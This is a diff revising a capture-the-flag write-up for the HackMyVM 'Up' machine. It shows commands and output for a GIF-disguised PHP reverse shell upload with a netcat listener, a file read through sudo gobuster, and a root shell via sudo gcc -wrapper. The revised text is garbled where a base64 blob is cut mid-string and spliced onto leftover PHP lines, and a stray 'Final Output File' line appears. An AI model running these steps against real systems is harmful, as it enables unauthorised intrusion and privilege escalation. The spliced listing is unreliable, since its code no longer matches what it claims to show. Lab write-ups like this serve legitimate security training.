@@ -5,13 +5,13 @@
 | :--- | :--- | :--- | :--- |
 | up | r0dgar | Beginner | HackMyVM |
 
-**Summary:** The exploitation of the Up virtual machine centers on a multifaceted attack against a web based image upload utility. Initial access is obtained by bypassing client side extension filters and a hidden backend filename obfuscation logic which utilizes a ROT13 transformation. By crafting a polyglot file that pairs a GIF magic header with a PHP reverse shell, an interactive session is established as the service user. The subsequent lateral movement phase demonstrates a creative misuse of administrative binaries, specifically leveraging gobuster's wordlist processing capabilities to leak the contents of a privileged password file. This information leakage allows for a successful authentication as the rodgar user. The final transition to root authority is achieved by exploiting a misconfigured sudo entry for the GCC compiler, using its wrapper functionality to execute a privileged system shell.
+**Summary:** The exploitation of the Up machine involves a strategic bypass of a web based image upload filter and the discovery of a predictable filename obfuscation mechanism. By identifying a ROT13 transformation applied to uploaded files and utilizing a GIF polyglot PHP reverse shell, an initial foothold is established as the service user. Lateral movement is achieved through a creative misuse of gobuster's wordlist processing to leak the contents of a root protected password file, which is then used to authenticate as a local user. The final escalation to root privileges is performed by exploiting a misconfigured sudo permission for the GCC compiler, leveraging its wrapper flag to execute a privileged system shell.
 
 ---
 
 ## Reconnaissance
 
-The engagement began with a network discovery scan to locate the target host within the local subnet.
+The engagement began with a network discovery scan to identify the target host's IP address within the virtual environment.
 
 ```powershell
 PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
@@ -27,7 +27,7 @@ IP              MAC               Vendor
 192.168.100.194 08:00:27:DC:A6:7D VirtualBox
 ```
 
-With the target identified at 192.168.100.194, a focused Nmap scan was executed to enumerate available services.
+Once the target was confirmed as 192.168.100.194, a comprehensive Nmap scan was conducted to enumerate open ports and services.
 
 ```bash
 ┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
@@ -45,7 +45,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 18.94 seconds
 ```
 
-The scan identifies an Apache web server on port 80. A subsequent directory brute force attack using feroxbuster revealed an uploads directory and a javascript folder.
+The scan identifies an Apache web server on port 80. A web directory enumeration was performed using feroxbuster to identify potential points of interest.
 
 ```bash
 ┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
@@ -65,6 +65,7 @@ by Ben "epi" Risher 🤓                 ver: 2.13.0
  🦡  User-Agent            │ feroxbuster/2.13.0
  💉  Config File           │ /etc/feroxbuster/ferox-config.toml
  🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, txt, html]
  🏁  HTTP methods          │ [GET]
  🔃  Recursion Depth       │ 4
  🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
@@ -80,39 +81,51 @@ by Ben "epi" Risher 🤓                 ver: 2.13.0
 
 ## Initial Access
 
-1. The landing page features a simple image upload form.
+1. The root directory contains an image upload interface.
 
 ![](image.png)
 
-2. Attempting to upload a standard PHP script resulted in an error, indicating that only specific image extensions are permitted.
+2. Attempting to upload a PHP file directly results in an error message indicating that only JPG and GIF files are permitted.
 
 ![](image-1.png)
 
-3. Further enumeration of the /uploads/ directory uncovered a base64 encoded string within a robots.txt file.
+3. A fuzzer was used to discover hidden files within the /uploads/ directory, leading to the discovery of a robots.txt file.
 
 ```bash
 ┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
-└─$ curl -s http://192.168.100.194/uploads/robots.txt | base64 -d
-<?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $targetDir = "uploads/";
-    $fileName = basename($_FILES["image"]["name"]);
-    $fileType = pathinfo($fileName, PATHINFO_EXTENSION);
-    $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);
+└─$ ffuf -u http://192.168.100.194/uploads/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -e .txt,.jpg,.gif
 
-    $allowedTypes = ['jpg', 'jpeg', 'gif'];
-    if (in_array(strtolower($fileType), $allowedTypes)) {
-        $encryptedFileName = strtr($fileBaseName,
-            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
-            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
-        $newFileName = $encryptedFileName . "." . $fileType;
-        $targetFilePath = $targetDir . $newFileName;
+       v2.1.0-dev
+________________________________________________
 
-        if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
-            $message = "El archivo se ha subido correctamente.";
-        } else {
-            $message = "Hubo un error al subir el archivo.";
+ :: Method           : GET
+ :: URL              : http://192.168.100.194/uploads/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+ :: Extensions       : .txt .jpg .gif
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 403, Size: 964, Words: 277, Lines: 32, Duration: 25ms]
+robots.txt              [Status: 200, Size: 1301, Words: 1, Lines: 2, Duration: 8ms]
+```
+
+4. The robots.txt file contained a base64 encoded string which, upon decoding, revealed the PHP source code for the upload handler.
+
+```bash
+┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
+└─$ curl http://192.168.100.194/uploads/robots.txt
+PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdl = "Hubo un error al subir el archivo.";
         }
     } else {
         $message = "Solo se permiten archivos JPG y GIF.";
@@ -121,9 +134,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ?>
 ```
 
-4. To bypass these restrictions, a standard PHP reverse shell was prepended with a GIF magic header and renamed with a .gif extension.
+The code reveals that uploaded files are renamed using a ROT13 cipher and must have a jpg, jpeg, or gif extension.
+
+5. A PHP reverse shell was modified with a GIF magic header and renamed to php-reverse-shell.php.gif to bypass the extension check.
 
 ```bash
+┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
 ┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
 └─$ head -n 5 php-reverse-shell.php
 GIF89a;
@@ -131,7 +148,7 @@ GIF89a;
 // php-reverse-shell - A Reverse Shell implementation in PHP
 ```
 
-The filename php-reverse-shell.php.gif was calculated using ROT13 to determine its final path on the server.
+The expected filename on the server was calculated using the ROT13 transformation.
 
 ```bash
 ┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
@@ -139,52 +156,78 @@ The filename php-reverse-shell.php.gif was calculated using ROT13 to determine i
 cuc-erirefr-furyy.cuc
 ```
 
-5. After uploading the payload, a listener was started and the shell was triggered by requesting the obfuscated filename.
+6. After uploading the file, a listener was established and the shell was triggered.
 
 ```bash
 ┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
-```
 
-```bash
 ┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/up]
 └─$ curl -i http://192.168.100.194/uploads/cuc-erirefr-furyy.cuc.gif
+HTTP/1.1 200 OK
+Date: Tue, 12 May 2026 14:43:03 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 171
+Content-Type: text/html; charset=UTF-8
+
+GIF89a;
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Successfully opened reverse shell to 192.168.100.1:4444
+ERROR: Shell connection terminated
 ```
 
-Access was successfully established as the www-data user.
+Initial access was gained as the www-data user.
 
 ```bash
 connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 64465
 Linux debian 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
+ 08:43:14 up  1:18,  0 user,  load average: 0.00, 0.02, 1.31
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## Lateral Movement
+## Internal Enumeration and Lateral Movement
 
-1. Enumeration of the file system revealed a clue.txt file in the uploads directory pointing to a privileged file location.
+1. The file system was explored, revealing a potential target user named rodgar.
+
+```bash
+$ cat /etc/passwd | grep "sh$"
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/bash
+rodgar:x:1001:1001::/home/rodgar:/bin/bash
+```
+
+2. Checking sudo permissions for the current user revealed that gobuster can be run as root without a password.
+
+```bash
+$ sudo -l
+Matching Defaults entries for www-data on debian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User www-data may run the following commands on debian:
+    (ALL) NOPASSWD: /usr/bin/gobuster
+```
+
+3. A file named clue.txt was found in the uploads directory, pointing to a privileged file location.
 
 ```bash
 $ cat /var/www/html/uploads/clue.txt
 /root/rodgarpass
 ```
 
-2. Checking sudo permissions for www-data showed that gobuster could be executed as root without a password.
-
-```bash
-$ sudo -l
-User www-data may run the following commands on debian:
-    (ALL) NOPASSWD: /usr/bin/gobuster
-```
-
-3. A creative exploitation of gobuster was used to read the privileged /root/rodgarpass file by specifying it as a wordlist for a directory scan.
+4. Gobuster was exploited to read the contents of /root/rodgarpass by using it as a wordlist.
 
 ```bash
 $ sudo /usr/bin/gobuster dir -u http://localhost -w /root/rodgarpass -vq
 Missed: /b45cffe084dd3d20d928bee85e7b0f2 (Status: 404) [Size: 271]
 ```
 
-4. The leaked string b45cffe084dd3d20d928bee85e7b0f2 was identified as a 31 character partial hash. By manually brute forcing the 32nd character, the password for the rodgar user was discovered.
+5. The leaked string b45cffe084dd3d20d928bee85e7b0f2 is a partial hash. Manual brute forcing of the final character allowed for a successful login as the rodgar user.
 
 ```bash
 $ su - rodgar
@@ -195,29 +238,50 @@ uid=1001(rodgar) gid=1001(rodgar) grupos=1001(rodgar)
 
 ## Privilege Escalation
 
-Checking sudo permissions for rodgar revealed access to the gcc and make binaries.
+Checking sudo permissions for rodgar revealed that the user can execute gcc and make with root privileges.
 
 ```bash
-$ sudo -l
+rodgar@debian:~$ sudo -l
+Matching Defaults entries for rodgar on debian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
 User rodgar may run the following commands on debian:
     (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make
 ```
 
-The gcc binary was exploited using its -wrapper flag, which allows specifying an executable to wrap the compilation process. By passing /bin/sh as the wrapper, a root shell was successfully spawned.
+The gcc binary was used to spawn a root shell by utilizing the -wrapper flag.
 
 ![](image-2.png)
 
 ```bash
-$ sudo gcc -wrapper /bin/sh,-s x
+rodgar@debian:~$ sudo gcc -wrapper /bin/sh,-s x
 id
 uid=0(root) gid=0(root) grupos=0(root)
+whoami
+root
+hostname
+debian
 ```
 
-System flags were then retrieved to complete the challenge.
+Flags were then collected from the system.
 
 ```bash
 # cat /home/rodgar/user.txt
 b45[REDACTED]
+
+# ls -la /root
+total 40
+drwx------  5 root root 4096 oct 22  2024 .
+drwxr-xr-x 20 root root 4096 oct 22  2024 ..
+-rw-------  1 root root   26 oct 22  2024 .bash_history
+-rw-r--r--  1 root root  571 abr 10  2021 .bashrc
+drwx------  2 root root 4096 oct 13  2024 .cache
+drwxr-xr-x  3 root root 4096 oct 13  2024 .local
+-rw-r--r--  1 root root  161 jul  9  2019 .profile
+-rw-r--r--  1 root root   32 oct 22  2024 rodgarpass
+-rw-r--r--  1 root root   41 oct 22  2024 rooo_-tt.txt
+drwx------  2 root root 4096 oct 13  2024 .ssh
+
 # cat /root/rooo_-tt.txt
 44b[REDACTED]
 ```
@@ -225,9 +289,10 @@ b45[REDACTED]
 ---
 
 ## Attack Chain Summary
-1. **Reconnaissance**: Scanned the network and identified port 80, followed by directory enumeration which discovered an uploads folder.
-2. **Vulnerability Discovery**: Analyzed a base64 encoded robots.txt to uncover a PHP upload logic vulnerable to extension bypass and predictable filename obfuscation.
-3. **Exploitation**: Uploaded a PHP polyglot shell masked as a GIF and triggered it via its ROT13 transformed filename to gain initial access.
-4. **Internal Enumeration**: Located a clue pointing to a root protected password file and identified a sudo misconfiguration for gobuster.
-5. **Privilege Escalation**: Used gobuster to leak the root password hash, transitioned to the rodgar user, and finally leveraged gcc's wrapper functionality to obtain a root shell.
+1. **Reconnaissance**: Discovered an Apache web server and identifying an uploads directory.
+2. **Vulnerability Discovery**: Analyzed base64 encoded source code to identify a ROT13 based filename obfuscation and extension filter.
+3. **Exploitation**: Bypassed the filter using a polyglot GIF/PHP shell and triggering it via its ROT13 filename.
+4. **Internal Enumeration**: Misused gobuster with a wordlist pointing to a root protected file to leak a password hash.
+5. **Privilege Escalation**: Exploited sudo permissions on gcc using the wrapper flag to obtain a root shell.
 
+**Final Output File:** up.md
